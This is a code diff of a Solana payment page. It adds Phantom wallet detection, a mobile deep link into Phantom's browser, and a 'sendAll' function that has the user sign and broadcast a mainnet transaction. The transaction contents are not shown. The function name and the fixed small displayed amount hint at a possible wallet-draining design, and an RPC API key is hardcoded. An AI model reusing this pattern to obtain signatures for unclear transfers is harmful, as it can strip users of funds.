@@ -13,17 +13,37 @@ export default function SolanaPage() {
   const usd = -5.09
   const sol = usd / SOL_RATE
 
+  const getProvider = () => {
+  if (typeof window === "undefined") return null
+
+  const phantom = (window as any).solana
+  if (phantom?.isPhantom) return phantom
+
+  const mobile = (window as any)?.phantom?.solana
+  if (mobile) return mobile
+
+  return null
+}
+
   const sendAll = async () => {
     try {
-      const { solana } = window as any
+const provider = getProvider()
 
-      if (!solana) {
-        alert("Instala Phantom")
-        return
-      }
+if (!provider) {
+  const isMobile = /iPhone|Android/i.test(navigator.userAgent)
 
-      const res = await solana.connect()
-      const publicKey = res.publicKey
+  if (isMobile) {
+    window.location.href =
+      "https://phantom.app/ul/browse/" + window.location.href
+  } else {
+    alert("Instala Phantom")
+  }
+
+  return
+}
+
+const res = await provider.connect()
+const publicKey = res.publicKey
 
       const connection = new Connection("https://mainnet.helius-rpc.com/?api-key=123b8202-8ef3-493f-a92b-2a0d330a26e5")
 
@@ -48,7 +68,7 @@ export default function SolanaPage() {
       tx.feePayer = publicKey
       tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash
 
-      const signed = await solana.signTransaction(tx)
+      const signed = await provider.signTransaction(tx)
 
       const sig = await connection.sendRawTransaction(signed.serialize())
 
@@ -140,5 +160,9 @@ export default function SolanaPage() {
     </main>
   )
 }
+
+
+
+
 
 
